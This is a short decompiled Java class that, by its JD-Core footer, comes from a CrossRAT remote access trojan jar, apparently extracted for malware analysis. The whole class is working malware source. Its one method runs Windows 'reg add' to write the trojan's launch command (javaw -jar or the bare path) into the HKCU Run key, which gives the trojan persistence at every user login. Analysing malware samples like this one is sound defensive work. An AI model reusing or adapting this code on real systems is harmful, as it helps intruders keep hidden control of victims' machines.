package b;

public final class e
  extends a
{
  public e(String paramString1, String paramString2, boolean paramBoolean)
  {
    super(paramString1, paramString2, paramBoolean);
  }
  
  public final void a()
  {
    String str;
    if (this.a)
    {
      str = System.getProperty("java.home") + "\\bin\\javaw.exe";
      str = str + " -jar \"" + this.c + "\"";
    }
    else
    {
      str = this.c;
    }
    Runtime.getRuntime().exec(new String[] { "reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", "/v", this.b, "/t", "REG_SZ", "/d", str, "/f" });
  }
}


/* Location:              C:\Users\sihadan\Desktop\CrossRAT\CrossRAT\CrossRat\hmar6.jar!\b\e.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */